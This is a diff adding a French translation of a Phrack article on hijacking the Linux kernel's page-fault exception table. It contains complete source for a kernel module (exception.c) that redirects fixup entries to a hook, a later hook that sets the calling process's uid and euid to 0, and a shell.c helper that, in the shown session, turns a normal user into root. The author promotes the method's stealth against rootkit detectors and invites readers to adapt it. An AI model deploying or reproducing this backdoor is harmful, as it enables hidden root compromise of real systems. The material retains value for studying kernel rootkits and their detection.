@@ -1,0 +1,888 @@
+
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3d, Phile #0x07 of 0x0f
+
+|=-------------=[ Hijacking Linux Page Fault Handler ]=------------------=|
+|=-------------=[            Exception Table         ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------=[ buffer <buffer@antifork.org> ]=---------------------=|
+|=------------------[ http://buffer.antifork.org ]=----------------------=|
+|=---------------------[ Traduit par X-FaKtOr ]=-------------------------=|
+
+
+
+
+--[ Sommaire
+
+    
+    1.  Introduction
+    2.  Appels systèmes et accès au User Space
+    3.  Exception page fault
+    4.  Implémentation
+    5.  Autres considérations
+    6.  Conclusions
+    7.  Remerciements
+    8.  Références
+
+
+
+--[ 1 - Introduction
+
+
+"Juste un autre LKM Linux"... c'est ce que vous pourriez penser en lisant
+cet article. Dans les années passées nous avons vu beaucoup de techniques
+pour cacher toutes sortes de choses, par ex. des processus, des connections
+réseaux, des fichiers, etc., via l'utilisation des LKM.Les premières
+techniques étaient vraiment simples à comprendre. Le réel problème avec ces
+techniques est qu'elles sont facilement détectables, comme beaucoup
+d'autres. Si vous remplacez une adresse dans la table des syscall ou si
+vous écrasez les 7 premiers octets dans le code du syscall (comme décrit
+par Silvio Cesare [4]), il est assez facile pour des outils tels que  Kstat
+[5] et/ou AngeL [6] d'identifier ces activités malicieuses. Plus tard, des
+techniques plus sophistiquées furent présentées. Une technique intéressante
+fut proposée par kad, qui suggéra de modifier la table des descripteurs
+d'interruptions de  manière à rediriger une exception levée depuis un code
+du User Space(telle que "Erreur de division") pour exécuter ou nouveau
+handler dont l'adresse remplace celle de l'original dans l'entrée de l'IDT
+[7]. Cette idée est belle mais elle a deux désavantages:
+
+1- Cette méthode est détectable en usant d'une approche basée sur les
+valeurs des hashs calculées à partir de l'IDT entière, comme montré par
+AngeL dans ses dernières releases 0.9.x. Ceci est du principalement au fait
+que l'adresse à laquelle réside l'IDT dans le kernel space peut être
+obtenue car sa valeur est stockée dans le registre %idtr. Ce registre peut
+être lu via l'instruction assembleur sidt qui nous autorise à la stocker
+dans une variable.
+
+2- Si le code d'un utilisateur exécute une division par 0 (cela peut se
+produire...) un comportement étrange peut apparaître. Oui, nous pourrions
+penser que ceci est rare si nous choisissons le bon handler, mais y a-t'il
+une solution plus sure?
+
+L'idée que je propose a juste un but: Fournir une furtivité efficace contre
+tous les outils utilisés pour la détection de LKMs malicieux. La technique
+est basée sur une fonctionnalité du kernel qui n'est jamais utilisé dans la
+pratique. En fait, comme nous allons le voir, nous explorerons un mécanisme
+de protection général dans le sous-système de gestion de la mémoire.  Ce
+mécanisme est utilisé uniquement si un code du user space est complètement
+buggé et ce n'est généralement pas le cas.
+
+Trêve de mots allons-y!
+
+
+--[ 2 - Appels systèmes et accès au User Space
+
+
+Avant tout un mot sur la théorie. Je vais me référer au kernel Linux
+2.4.20, cependant le code est presque identique pour les kernel 2.2. En
+particulier nous sommes intéressés par ce qui se produit dans certaines
+situations quand nous devons demander une fonctionnalité du kernel par
+l'intermédiaire d'un syscall. Quand un syscall est appelé depuis le user
+space(via l'interruption logicielle 0x80)le handler d'interruption
+system_call() est exécuté. Jetons un oeil à son implémentation, trouvée
+dans arch/i386/kernel/entry.S.
+
+
+ENTRY(system_call)
+        pushl %eax                      # sauve orig_eax
+        SAVE_ALL
+        GET_CURRENT(%ebx)
+        testb $0x02,tsk_ptrace(%ebx)    # PT_TRACESYS
+        jne tracesys
+        cmpl $(NR_syscalls),%eax
+        jae badsys
+        call *SYMBOL_NAME(sys_call_table)(,%eax,4)
+        movl %eax,EAX(%esp)             # sauve la valeur de retour
+[..]
+
+
+Comme nous pouvons le voir, system_call() sauve le contenu de chaque
+registre dans la pile du mode Kernel. Il en résulte un pointeur sur la
+structure task_struct du processus courant en exécution via l'appel
+GET_CURRENT(%ebx).  Quelques vérifications sont faites que les numéros de
+syscall sont corrects et pour voir si le process est actuellement en train
+d'être tracé. Finalement le sycall est appelé via sys_call_table, ce qui
+conserve les adresses des syscall, en utilisant le numéro de syscall sauvé
+dans %eax en tant qu'offset à l'intérieur de la table. Maintenant jetons un
+oeil à quelque syscall particuliers.  Pour nos ambitions nous cherchons des
+syscalls qui prennent un pointeur vers le User Space comme argument. J'ai
+choisi sys_ioctl() mais il y en a d'autres avec des caractéristiques
+similaires.
+
+
+asmlinkage long sys_ioctl(unsigned int fd, unsigned int cmd, unsigned long
+arg)
+{
+        struct file * filp;
+        unsigned int flag;
+        int on, error = -EBADF;
+[..]
+
+	 case FIONBIO:
+               if ((error = get_user(on, (int *)arg)) != 0)
+                       break;
+               flag = O_NONBLOCK;
+[..]
+
+
+
+La macro get_user() est utilisée pour copier des données du User Space vers
+le Kernel Space. Dans ce cas nous portons notre attention sur le code pour
+mettre des E/S non bloquantes sur le descripteur de fichier passé au
+syscall. Un exemple d'utilisation correcte, à partir du User Space, de
+cette fonctionnalité pourrait être :
+
+
+
+	int	on = 1;
+
+	ioctl(fd, FIONBIO, &on); 
+
+
+Jetons un coup d'oil à l'implémentation de get_user() qui peut être trouvée
+dans include/asm/uaccess.h.
+
+
+#define __get_user_x(size,ret,x,ptr) \
+        __asm__ __volatile__("call __get_user_" #size \
+                :"=a" (ret),"=d" (x) \
+                :"0" (ptr))
+        
+/* Attention : on doit caster le résultat au type du pointeur pour des raisons de signe*/
+#define get_user(x,ptr)                                                 \
+({      int __ret_gu,__val_gu;                                          \
+        switch(sizeof (*(ptr))) {                                       \
+        case 1:  __get_user_x(1,__ret_gu,__val_gu,ptr); break;          \
+        case 2:  __get_user_x(2,__ret_gu,__val_gu,ptr); break;          \
+        case 4:  __get_user_x(4,__ret_gu,__val_gu,ptr); break;          \
+        default: __get_user_x(X,__ret_gu,__val_gu,ptr); break;          \
+        }                                                               \
+        (x) = (__typeof__(*(ptr)))__val_gu;                             \
+        __ret_gu;                                                       \
+})
+
+
+Comme nous pouvons le voir, get_user() est implémenté d'une manière très
+élégante car il appelle la bonne fonction en se basant sur la taille de
+l'argument qui doit être copié a partir du User Space. Selon la valeur de
+(sizeof (*(ptr))) __get_user_1(), __get_user_2() or __get_user_4(),
+seraient appelées.
+
+Maintenant jetons un oeil à l'une de ces fonctions, __get_user_4(), qui
+peut être trouvée dans arch/i386/lib/getuser.S.
+
+
+
+addr_limit = 12
+
+[..]
+
+.align 4
+.globl __get_user_4
+__get_user_4:
+        addl $3,%eax
+        movl %esp,%edx
+        jc bad_get_user
+        andl $0xffffe000,%edx
+        cmpl addr_limit(%edx),%eax
+        jae bad_get_user
+3:      movl -3(%eax),%edx
+        xorl %eax,%eax
+        ret
+  
+bad_get_user:
+        xorl %edx,%edx
+        movl $-14,%eax
+        ret
+  
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+
+Les dernières lignes entre .section et .previous identifient la table
+d'exception dont nous allons parler plus loin étant donné que c'est
+important pour notre but. 
+
+Comme on le voit, l'implémentation de __get_user_4() est franche.
+L'adresse de l'argument est le registre %eax. En ajoutant 3 %eax, il est
+possible d'obtenir la plus grande adresse référencée du User Space. Il est
+nécessaire de contrôler si cette adresse est bien dans la tranche
+adressable du User Space (De 0x00000000 à PAGE_OFFSET - 1 ou PAGE_OFFSET
+est généralement 0xc0000000). 
+
+Si, en comparant l'adresse du User Space avec current->addr_limit.seg
+(Stocké à l'offset 12 à partir du début du descripteur de tache, dont le
+pointeur a été obtenu en mettant a zéro les 13 derniers bits du la pile du
+mode Kernel) nous trouvons que c'est supérieur à PAGE_OFFSET - 1, nous
+sautons au label bad_get_user mettant ainsi %edx à zéro et mettant -EFAULT
+(-14) dans %eax (valeur de retour du syscall).
+
+Mais que se passe t-il si cette adresse est dans la tranche mémoire
+adressable (Inférieur à PAGE_OFFSET) mais a l'extérieur de l'espace
+d'adressage du process?  Quelqu'un avait dit Page Fault?!
+
+
+--[ 3 - Exception Page Fault
+
+
+"Une exception page fault est levée quand la page d'adresse n'est pas
+présente dans la mémoire, l'entrée correspondante de la table des pages est
+nulle ou une violation du mécanisme de protection de la pagination s'est
+produite." [1]
+
+Linux gère une exception page fault avec le handler de page fault
+do_page_fault(). Ce handler peut être trouvé dans arch/i386/mm/fault.c
+
+En particulier, nous sommes intéressés par les trois cas qui peuvent se
+produire lorsqu'une page fault se produit dans le Mode Kernel.
+
+Dans le premier cas, "le kernel tente d'adresser une appartenance de page à
+l'espace d'adressage du process, mais soit la cadre de page correspondante
+n'existe pas(Demande de Pagination) soit le kernel tente d'écrire sur une
+page en lecture seule (Copy On Right)." [1]
+
+Dans le second cas, "certaines fonctions du kernel incluent un bug de
+programmation qui provoquent la levée d'une exception lorsque le programme
+est exécuté; Dans certains cas, l'exception peut être causée par une erreur
+matérielle passagère." [1]
+
+Ces deux cas ne sont pas intéressant dans notre cadre.
+
+Le troisième (et intéressant) cas se produit lorsque "une routine d'appel
+système de service (tel que sys_ioctl() dans notre exemple) tente de lire
+ou d'écrire dans une zone mémoire dont l'adresse a été passée en tant que
+paramètre d'un appel système, mais cette adresse n'appartient pas à
+l'espace d'adressage du process." [1]
+
+Le premier cas est aisément identifiable en regardant les régions mémoires
+du process. Si l'adresse qui à causé l'exception appartient à l'espace
+d'adressage du process il va planter à l'intérieur d'une région mémoire du
+process.  Ceci n'est pas intéressant dans notre propos.
+
+La chose intéressante est la façon dont le kernel peut distinguer le
+deuxième du troisième cas. La clé pour déterminer la source d'un page fault
+réside dans les rangées peu espacées d'appels que le kernel utilise pour
+accéder à l'espace mémoire du process.
+
+Dans cette optique, le kernel construit une table d'exception dans la
+mémoire du kernel. Les limites d'une telle région sont définies par les
+symboles __start___ex_table et __stop___ex_table. Leurs valeurs peuvent
+être aisément déduites à partir de System.map de cette manière.
+
+
+buffer@rigel:/usr/src/linux$ grep ex_table System.map 
+c0261e20 A __start___ex_table
+c0264548 A __stop___ex_table
+buffer@rigel:/usr/src/linux$
+
+Quel est le contenu de cette zone mémoire? Dans cette zone vous pouvez
+trouver bon nombre d'adresses. La première (insn) représente l'adresse de
+l'instruction (appartenant à une fonction qui accède à la rangée d'adresses
+du User Space, telles que celles décrites précédemment) qui peut lever un
+page fault. La seconde (fixup) est un pointeur sur "fixup code".
+
+Lorsqu'un page fault se produit dans le kernel et que le premier cas n'est
+pas vérifié, le kernel vérifie si l'adresse qui cause le page fault
+correspond à une entrée insn dans la table d'exception. Si ce n'est pas  le
+cas nous sommes dans le second cas et le kernel lève un Oops.  Sinon, si
+l'adresse correspond à une entrée insn dans la table d'exception nous
+sommes dans le troisième cas comme l'exception page fault a été levée lors
+d'un accès à une adresse du User Space. Dans ce cas, le contrôle est passé
+à la fonction dont l'adresse est spécifiée dans la table des exceptions en
+tant que code correctif.
+
+Ceci se fait simplement de la façon suivante :
+
+
+if ((fixup = search_exception_table(regs->eip)) != 0) {
+                regs->eip = fixup;
+                return;
+        }
+
+
+La fonction search_exception_table() recherche une entrée insn dans la
+table d'exception qui correspond à l'adresse de l'instruction qui a levé le
+page fault. Si elle est trouvée, cela veut dire que l'exception page fault
+a été levée durant un accès à une adresse du User Space. Dans ce cas,
+regs->eip est pointé par le code correctif et ensuite la fonction
+do_page_fault() retourne, sautant ainsi au code correctif.
+
+Il est évident que les trois fonctions __get_user_x(), qui accèdent à des
+adresses du User Space, doivent avoir un code correctif pour gérer des
+situations telles que celles décrites précédemment. 
+
+En revenant en arrière jetons de nouveau un œil à __get_user_4()
+
+.align 4
+.globl __get_user_4
+__get_user_4:
+        addl $3,%eax
+        movl %esp,%edx
+        jc bad_get_user
+        andl $0xffffe000,%edx
+        cmpl addr_limit(%edx),%eax
+        jae bad_get_user
+3:      movl -3(%eax),%edx
+        xorl %eax,%eax
+        ret
+
+bad_get_user:
+        xorl %edx,%edx
+        movl $-14,%eax
+        ret
+
+.section __ex_table,"a"
+        .long 1b,bad_get_user
+        .long 2b,bad_get_user
+        .long 3b,bad_get_user
+.previous
+
+
+Avant tout, en regardant le code, nous devons porter notre attention à la
+directive GNU assembleur .section qui permet au programmeur de spécifier
+quelle section de l'exécutable va contenir le code qui va suivre.
+L'attribut  "a" spécifie que la section doit être chargée en mémoire en
+même temps que le reste de l'image kernel. Ainsi, dans  ce cas, les trois
+entrées sont insérées dans la table d'exception du kernel et sont chargées
+avec le reste de l'image kernel.
+
+Maintenant, regardons __get_user_4(), il y à une instruction avec comme
+label 3.
+
+
+3:      movl -3(%eax),%edx
+
+
+Si nous avons ajouté 3 à %eax (c'est fait dans la première instruction de
+la fonction __get_user_4() à des fins de vérifications comme souligné
+précédemment), -3(%eax) est l'adresse de début de l'argument de 32 bits à
+copier à partir du User Space. Ainsi, c'est l'instruction qui accède
+réellement aux adresses du User Space. Jetez un coup d'oeil à la dernière
+entrée dans la table d'exception
+
+
+	.long 3b,bad_get_user
+
+
+Si vous savez que le suffixe b veut dire 'backard' pour indiquer que le
+label apparaît précédemment dans une précédente ligne de code (ou sinon
+ignorez çà c'est pour comprendre le signification de ce code), vous pouvez
+comprendre que nous avons en fait
+
+
+	insn  :	 address of   movl -3(%eax),%edx
+ 	fixup :  address of   bad_get_user
+
+
+Bon les gars, nous réalisons ici que bad_get_user est le code correctif
+pour la fonction __get_user_4() et il va être appelé à chaque fois que
+l'instruction portant le label 3 lève un page fault. Cela reste bien sûr
+toujours vrai pour les fonction get_user_1() et __get_user_2().
+
+A ce stade il nous faut l'adresse de bad_get_user.
+
+
+buffer@rigel:/usr/src/linux$ grep bad_get_user System.map
+c022f39c t bad_get_user
+buffer@rigel:/usr/src/linux$
+
+
+Si vous compilez exception.c (montré après) avec le flag FIXUP_DEBUG, vous
+allez voir ceci dans les fichiers de logs qui vous montrent ce que ce dont
+nous avons parlé plus tôt.
+
+
+May 23 18:36:35 rigel kernel:  address : c0264530 insn: c022f361 
+			       fixup : c022f39c 
+May 23 18:36:35 rigel kernel:  address : c0264538 insn: c022f37a 
+			       fixup : c022f39c 
+May 23 18:36:35 rigel kernel:  address : c0264540 insn: c022f396 
+			       fixup : c022f39c
+
+
+buffer@rigel:/usr/src/linux$  grep __get_user_ System.map  
+c022f354 T __get_user_1 
+c022f368 T __get_user_2 
+c022f384 T __get_user_4
+
+
+En regardant la dernière entrée dans la table d'exception, nous pouvons
+facilement réaliser que 0xc022f396 est l'adresse de l'instruction labellée
+3 dans le code source de __get_user_4() qui pourrait lever un page fault
+comme souligné plus tôt. Bien sur, la situation est similaire pour les deux
+autres fonctions.
+
+Maintenant l'idée devrait apparaître clairement. Si je remplace le code
+correctif dans la table d'exception et ensuite dans le User Space j'appelle
+juste un syscall avec un argument dont l'adresse est erronée, je peux
+forcer l'exécution de ce que je veux. Et pour faire cela, j'ai juste besoin
+de modifier 4 octets ! De plus, cela apparaît particulièrement furtif car
+cette situation n'est pas si courante que çà. En fait, pour provoquer cette
+situation, il est nécessaire que le programme que vous allez exécuter
+contienne un bug en passant un argument à un syscall. Si vous savez que
+cela peut mener à quelque chose d'intéressant vous pouvez même le faire
+mais cette situation est très rare. Dans le prochain paragraphe je vais
+vous présenter une preuve de concept qui montre comment exploiter ce que je
+viens d'exposer. Dans cette exemple, j'ai modifié l'adresse du code
+correctif des trois fonctions __get__user_x().
+
+
+--[ 4 - Implémentation
+
+
+C'est un LKM. Dans ce code, j'ai écrit en dur certaines valeurs prises dans
+mon fichier System.map mais ce n'est pas nécessaire d'éditer le code source
+étant donné que ces valeurs peuvent être passées au module an appelant
+insmod pour le lier au kernel. Si vous voulez plus de verbiage dans les
+fichiers de logs, compilez le avec le flag -DFIXUP_DEBUG (comme cela a été
+fait pour montrer les résultats précédent). 
+
+
+---------------[ exception.c ]----------------------------------------
+
+/*
+ * Filename: exception.c
+ * Creation date: 23.05.2003
+ * Author: Angelo Dell'Aera 'buffer' - buffer@antifork.org
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+#ifndef __KERNEL__
+#define __KERNEL__
+#endif
+
+#ifndef MODULE
+#define MODULE
+#endif
+
+#define __START___EX_TABLE 0xc0261e20
+#define __END___EX_TABLE   0xc0264548
+#define BAD_GET_USER       0xc022f39c
+
+unsigned long start_ex_table = __START___EX_TABLE;
+unsigned long end_ex_table = __END___EX_TABLE;
+unsigned long bad_get_user = BAD_GET_USER;
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+
+#ifdef FIXUP_DEBUG
+#  define PDEBUG(fmt, args...) printk(KERN_DEBUG "[fixup] : " fmt, ##args)
+#else
+#  define PDEBUG(fmt, args...) do {} while(0)
+#endif
+
+MODULE_PARM(start_ex_table, "l");
+MODULE_PARM(end_ex_table, "l");
+MODULE_PARM(bad_get_user, "l");
+
+
+struct old_ex_entry {
+        struct old_ex_entry     *next;
+        unsigned long           address;
+        unsigned long           insn;
+        unsigned long           fixup;
+};
+  
+struct old_ex_entry *ex_old_table;
+
+void hook(void) 
+
+{
+        printk(KERN_INFO "Oh Jesus... it works!\n");
+} 
+
+void cleanup_module(void)
+{
+        struct old_ex_entry     *entry = ex_old_table;
+        struct old_ex_entry     *tmp;
+
+        if (!entry)
+                return;
+
+        while (entry) {
+                *(unsigned long *)entry->address = entry->insn;
+                *(unsigned long *)((entry->address) + sizeof(unsigned
+long)) = entry->fixup;
+                tmp = entry->next;
+                kfree(entry);
+                entry = tmp;
+        }
+
+        return;
+}
+
+
+int init_module(void)
+{
+        unsigned long       insn = start_ex_table;
+        unsigned long       fixup;
+        struct old_ex_entry *entry, *last_entry;
+
+        ex_old_table = NULL;
+        PDEBUG(KERN_INFO "hook at address : %p\n", (void *)hook);
+
+        for(; insn < end_ex_table; insn += 2 * sizeof(unsigned long)) {
+
+                fixup = insn + sizeof(unsigned long);
+
+                if (*(unsigned long *)fixup == BAD_GET_USER) {
+
+                        PDEBUG(KERN_INFO "address : %p insn: %lx fixup : %lx\n",
+                                        (void *)insn, *(unsigned long *)insn,
+                                        *(unsigned long *)fixup);
+        
+                        entry = (struct old_ex_entry *)kmalloc(GFP_ATOMIC,
+					sizeof(struct old_ex_entry));
+        
+                        if (!entry)
+                                return -1;
+
+                        entry->next = NULL;
+                        entry->address = insn;
+                        entry->insn = *(unsigned long *)insn;
+                        entry->fixup = *(unsigned long *)fixup;
+
+                        if (ex_old_table) {
+                                last_entry = ex_old_table;
+        
+                        	while(last_entry->next != NULL)
+                                	last_entry = last_entry->next;
+
+                                last_entry->next = entry;
+                        } else
+                                ex_old_table = entry;
+                
+                        *(unsigned long *)fixup = (unsigned long)hook;
+                
+                        PDEBUG(KERN_INFO "address : %p insn: %lx fixup : %lx\n",
+                                        (void *)insn, *(unsigned long *)insn,
+                                        *(unsigned long *)fixup);
+
+
+                }
+
+        }
+
+        return 0;
+}
+        
+MODULE_LICENSE("GPL");
+
+-------------------------------------------------------------------------
+
+
+
+Et maintenant un code simple qui appelle ioctl(2) avec un mauvais argument.
+
+
+
+---------------- [ test.c ]----------------------------------------------
+
+
+/*
+ * Filename: test.c
+ * Creation date: 23.05.2003
+ * Author: Angelo Dell'Aera 'buffer' - buffer@antifork.org
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+        int     fd;
+        int     res;
+
+        fd = open("testfile", O_RDWR | O_CREAT, S_IRWXU);
+        res = ioctl(fd, FIONBIO, NULL);
+        printf("result = %d errno = %d\n", res, errno);
+        return 0;
+}
+
+-------------------------------------------------------------------------
+
+
+Ok regardons comment cela marche.
+
+
+buffer@rigel:~$ gcc -I/usr/src/linux/include -O2 -Wall -c exception.c 
+buffer@rigel:~$ gcc -o test test.c
+buffer@rigel:~$ ./test 
+result = -1 errno = 14
+
+
+Comme nous le supposions, nous avons une erreur EFAULT (errno = 14).
+Tentons de lier notre module maintenant.
+
+
+buffer@rigel:~$ su 
+Password: 
+bash-2.05b# insmod exception.o
+bash-2.05b# exit
+buffer@rigel:~$ ./test 
+result = 25 errno = 0
+buffer@rigel:~$ 
+
+
+En regardant /var/log/messages
+
+
+bash-2.05b# tail -f /usr/adm/messages
+[..]
+May 23 21:31:56 rigel kernel: Oh Jésus... ca fonctionne!
+
+
+Il semblerait que ça marche correctement ! :)
+Que peut-on faire ? Jetez un coup d'œil a ceci !
+
+En changeant la fonction hook() précédente par celle ci
+
+
+	void hook(void) 
+	{
+        	current->uid = current->euid = 0;
+	}
+
+
+et utiliser ce code du user space pour avertir le gestionnaire de page fault
+
+
+
+------------ shell.c -----------------------------------------------------
+
+
+/*
+ * Filename: shell.c
+ * Creation date: 23.05.2003
+ * Author: Angelo Dell'Aera 'buffer' - buffer@antifork.org
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ */
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+#include <sys/ioctl.h>
+
+int main()
+{
+        int     fd;
+        int     res;
+        char    *argv[2];
+
+        argv[0] = "/bin/sh";
+        argv[1] = NULL;
+
+        fd = open("testfile", O_RDWR | O_CREAT, S_IRWXU);
+        res = ioctl(fd, FIONBIO, NULL);
+        printf("result = %d errno = %d\n", res, errno);
+        execve(argv[0], argv, NULL);
+        return 0;
+}
+
+--------------------------------------------------------------------------
+
+
+buffer@rigel:~$ su  
+Password: 
+bash-2.05b# insmod exception.o 
+bash-2.05b# exit
+buffer@rigel:~$ gcc -o shell shell.c 
+buffer@rigel:~$ id
+uid=500(buffer) gid=100(users) groups=100(users)
+buffer@rigel:~$ ./shell 
+result = 25 errno = 0
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.05b# 
+
+
+Charmant, n'est-il pas ? :)
+
+C'est juste un exemple de ce que vous pouvez faire. En utilisant ce LKM,
+vous pouvez exécuter n'importe quoi comme si vous étiez root. Avez-vous
+besoin d'autre chose ? Et bien ce dont vous avez besoin est juste de
+modifier hook() et/ou le code du user space qui lève une exception page
+fault...Laissez libre cours à votre imagination !
+
+
+
+-- [ 5 - Autres considérations 
+
+
+Quand cette idée m'est venue à l'esprit je n'étais pas à même de réaliser
+ce que j'avais accomplit. Cela vint comme le résultat d'une masturbation
+intellectuelle. Et quelques heures plus tard je compris... 
+
+Pensez à ce qu'il vous faut pour changer une entrée dans la table des
+syscall pour rediriger un syscall. Ou pensez à ce dont vous avez besoin
+pour modifier les 7 premiers octets du code d'un syscall comme souligné par
+Silvio. Ce qu'il vous faut c'est juste une "note de référence". Ici votre
+"note de référence" est le symbole exporté sys_call_table dans les deux
+cas. Mais, malheureusement vous n'êtes pas le seul à savoir ceci. Les
+outils de détections  peuvent facilement le savoir (comme c'est un symbole
+exporté) et ainsi il est assez simple pour eux de détecter les changements
+dans la table de syscall et/ou dans le code du syscall. 
+
+Que se passe t-il si vous vous voulez modifier le table des descripteurs
+d'interruption comme expliqué par kad ? Vous avez besoin d'une "marque de
+référence" de la même manière. Dans ce cas, la "marque de référence" est
+l'adresse de l'IDT dans la mémoire du kernel. Mais cette adresse est
+également facile à retrouver et ce dont a besoin a un outil de détection
+pour l'obtenir est juste ceci
+
+
+	long long idtr; 
+	long __idt_table;
+
+	__asm__ __volatile__("sidt %0\n" : : "m"(idtr)); 
+	__idt_table = idtr >> 16;
+
+
+De ce fait, __idt_table va stocker l'adresse de l'IDT et ainsi obtenir
+facilement la "marque de référence" pour l'IDT. Ca se fait par
+l'intermédiaire de l'instruction asm sidt. AngeL, dans ces derniers
+releases 0.9.x, utilise cette approche et est capable de détecter en
+temps-réel une attaque basée sur ce qui est exposé dans [7].
+
+Maintenant repensons à ce dont j'ai parlé dans les précédents paragraphes.
+Il est facile à comprendre qu'obtenir une "marque de référence" pour table
+d'exception de page fault n'est pas toujours si simple comme dans les cas
+précédents.
+
+La seule façon pour retrouver l'adresse de la table d'exception de page
+fault est via le fichier System.map.
+
+Pendant que j'écrivais un outil de détection dont le but était de détecter
+ce type d'attaque, en faisant la supposition que le System.map réfère au
+kernel actuellement en fonctionnement j'ai pensé que cela pourrait être
+improductif. En fait, si ce n'était pas vrai, l'outil de détection pourrait
+commencer à monitorer les adresses où aucune donnée kernel importante ne
+réside.
+
+Souvenez-vous qu'il est aisé de générer un fichier System.map via nm(2)
+mais il y a de nombreux systèmes par les temps qui courent dont les
+administrateurs ignore tout simplement le rôle du System.map et ne le
+maintiennent pas à jour par rapport au kernel tournant actuellement.
+
+-- [ 6 - Conclusions
+
+
+Modifier le table de gestionnaire d'exception de page fault est assez
+simple comme nous venons de le réaliser. De plus, c'est vraiment furtif car
+il est possible d'obtenir des résultats fabuleux en modifiant juste 4
+octets dans la mémoire kernel. Dans mon code de preuve de concept, pour des
+raisons de simplicité, j'ai modifié 12 octets mais il est facile de se
+rendre compte qu'il est possible d'obtenir le même résultat en modifiant
+juste l'adresse du code correctif de __get_user_4().
+
+De plus, il est difficile de dénicher ces programmes avec ce type de bugs
+qui provoquent ce genre de comportement. Souvenez-vous que pour provoquer
+cette situation vous devez passer une mauvaise adresse à un syscall.
+Combien de programme faisant cela avez-vous déjà vu ? Je pense que ce type
+d'approche est vraiment furtif car cette situation ne se produit jamais. En
+fait, ce sont des bugs qui, s'ils sont présents, sont le plus souvent
+corrigés par les auteurs avant la distribution de leurs programmes. Le
+kernel doit implémenter l'approche décrite précédemment mais habituellement
+il n'y a aucune raison de l'exécuter.
+
+
+-- [ 7 - Remerciements
+
+
+Un grand merci aux gars de la recherche Antifork...c'était vraiment cool de
+bosser avec vous !
+
+
+-- [ 8 - Références
+
+
+ [1] "Understanding the Linux Kernel"
+     Daniel P. Bovet and Marco Cesati
+     O'Reilly 
+
+ [2] "Linux Device Drivers"
+      Alessandro Rubini and Jonathan Corbet
+      O'Reilly 
+
+ [3] Linux kernel source
+     [http://www.kernel.org]
+
+ [4] "Syscall Redirection Without Modifying the Syscall Table"
+     Silvio Cesare
+     [http://www.big.net.au/~silvio/]
+    
+ [5] Kstat
+     [http://www.s0ftpj.org/en/tools.html]
+
+ [6] AngeL
+     [http://www.sikurezza.org/angel]
+
+ [7] "Handling Interrupt Descriptor Table for Fun and Profit"
+     kad 
+     Phrack59-0x04
+     [http://www.phrack.org]
+
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
